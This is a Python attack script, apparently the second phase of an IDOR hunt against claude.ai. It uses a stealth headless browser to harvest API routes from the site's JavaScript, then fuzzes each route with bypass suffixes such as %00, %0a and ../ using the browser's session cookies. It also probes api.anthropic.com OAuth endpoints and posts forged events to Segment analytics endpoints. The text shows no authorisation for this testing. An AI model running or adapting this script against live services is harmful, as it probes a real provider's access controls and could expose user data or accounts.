#!/usr/bin/env python3
"""Phase 2: Discover new endpoints via JS source analysis + fuzz them."""
import asyncio, json, os, re
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-idor-phase2"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []

async def test_fetch(page, url, method="GET", body=None, extra_headers=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 2000), headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text.substring(0, 2000), headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai for JS source analysis...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # Extract API endpoints from JS bundles
    print("\n🔍 Extracting API endpoints from page source...")
    js_endpoints = await page.evaluate("""() => {
        const scripts = document.querySelectorAll('script[src]');
        return Array.from(scripts).map(s => s.src).filter(s => s.includes('_next') || s.includes('chunk'));
    }""")
    print(f"   Found {len(js_endpoints)} JS bundles")

    # Get page HTML for API route patterns
    page_html = await page.content()
    api_patterns = re.findall(r'/api/[\w/._-]+', page_html)
    api_patterns += re.findall(r'/edge-api/[\w/._-]+', page_html)
    api_patterns = list(set(api_patterns))
    print(f"   Found {len(api_patterns)} API patterns in HTML: {api_patterns[:20]}")

    # Fetch a JS bundle and extract more endpoints
    all_endpoints = set(api_patterns)
    for js_url in js_endpoints[:5]:
        try:
            js_content = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{js_url}');
                    return await resp.text();
                }} catch(e) {{ return ''; }}
            }}""")
            if js_content:
                found = re.findall(r'["\']/(api|edge-api)/[\w/._-]+["\']', js_content)
                cleaned = []
                for f in found:
                    part = f.split('/', 1)[1] if '/' in f else f
                    part = part.strip('"').strip("'")
                    cleaned.append(f"/{part}")
                found = cleaned
                all_endpoints.update(found)
                # Also look for route patterns
                routes = re.findall(r'pathname:\s*["\']([\w/._-]+)["\']', js_content)
                all_endpoints.update(routes)
        except:
            pass

    print(f"   Total unique endpoints: {len(all_endpoints)}")
    for ep in sorted(all_endpoints):
        print(f"      {ep}")

    # Now test all discovered endpoints with trailing symbols
    TRAILING = [",", ";", ":", "%00", "%0a", "?", "!", "../", "%20"]
    NEW_ENDPOINTS = [ep for ep in all_endpoints if ep not in [
        "/api/auth/login_methods", "/api/billing/gift/validate",
        "/api/billing/credits", "/api/billing/subscription",
        "/api/account_profile", "/api/organizations",
        "/api/organizations/discoverable", "/api/referral",
        "/api/referral/code", "/api/auth/send_magic_link",
        "/api/auth/verify_code", "/api/auth/session_reattest/webauthn/challenge",
        "/api/event_logging/v2/batch", "/api/published_artifacts/view_counts",
        "/api/account/migration_eligibility", "/api/team-trial/exposure-eligible",
        "/edge-api/bootstrap", "/api/banners",
    ]]

    print(f"\n🆕 New endpoints to test: {len(NEW_ENDPOINTS)}")

    for endpoint in sorted(NEW_ENDPOINTS):
        print(f"\n{'='*50}")
        print(f"🎯 {endpoint}")

        # Baseline
        url = f"https://claude.ai{endpoint}"
        baseline = await test_fetch(page, url)
        b_status = baseline.get("status", 0)
        body = baseline.get("body", "")
        print(f"   Baseline: {b_status} | {body[:120]}")

        # Save baseline
        FINDINGS.append({"endpoint": endpoint, "technique": "baseline", "url": url, "status": b_status, "body": body[:500]})
        with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
            json.dump(FINDINGS, fp, indent=2)

        # Test trailing symbols
        for sym in TRAILING:
            bypass_url = f"https://claude.ai{endpoint}{sym}"
            r = await test_fetch(page, bypass_url)
            status = r.get("status", 0)
            resp_body = r.get("body", "")

            if status != b_status and status != 0:
                print(f"   🔥 trailing-{sym:8s} → {status} | {b_status}→{status}")
                if resp_body and len(resp_body) > 10:
                    print(f"      Body: {resp_body[:150]}")
                FINDINGS.append({"endpoint": endpoint, "technique": f"trailing-{sym}", "url": bypass_url, "status": status, "body": resp_body[:500], "anomaly": f"CHANGE {b_status}→{status}"})
                with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
                    json.dump(FINDINGS, fp, indent=2)
            await asyncio.sleep(0.15)

    # Also test api.anthropic.com endpoints that might work from page context
    print(f"\n{'='*50}")
    print(f"🎯 Testing api.anthropic.com from page context...")
    api_endpoints = ["/v1/models", "/v1/me", "/v1/messages", "/v1/complete",
                     "/.well-known/oauth-authorization-server",
                     "/register", "/token", "/authorize", "/revoke",
                     "/v1/oauth/token"]
    for ep in api_endpoints:
        url = f"https://api.anthropic.com{ep}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        if status > 0:
            print(f"   {ep}: {status} | {body[:100]}")
            FINDINGS.append({"endpoint": ep, "technique": "api.anthropic.com-baseline", "url": url, "status": status, "body": body[:500]})
        await asyncio.sleep(0.15)

    # Test Segment endpoints with proper write key
    print(f"\n{'='*50}")
    print(f"🎯 Testing Segment with write key from page context...")
    # The Segment write key from session-010 was found in binary
    segment_key = "wk_token_9k6d5b7e7a7e4a4f8e8b8c7d6e5f"  # placeholder
    for ep in ["/v1/batch", "/v1/identify", "/v1/track", "/v1/import", "/v1/page", "/v1/screen"]:
        url = f"https://a-api.anthropic.com{ep}"
        r = await test_fetch(page, url, "POST", {"batch": [{"type": "track", "event": "test", "properties": {}, "anonymousId": "test"}]})
        status = r.get("status", 0)
        body = r.get("body", "")
        print(f"   {ep}: {status} | {body[:100]}")
        if status > 0:
            FINDINGS.append({"endpoint": ep, "technique": "segment-from-claude", "url": url, "status": status, "body": body[:500]})
        await asyncio.sleep(0.15)

    # Final save
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

    print(f"\n{'='*50}")
    print(f"📊 Total findings: {len(FINDINGS)}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
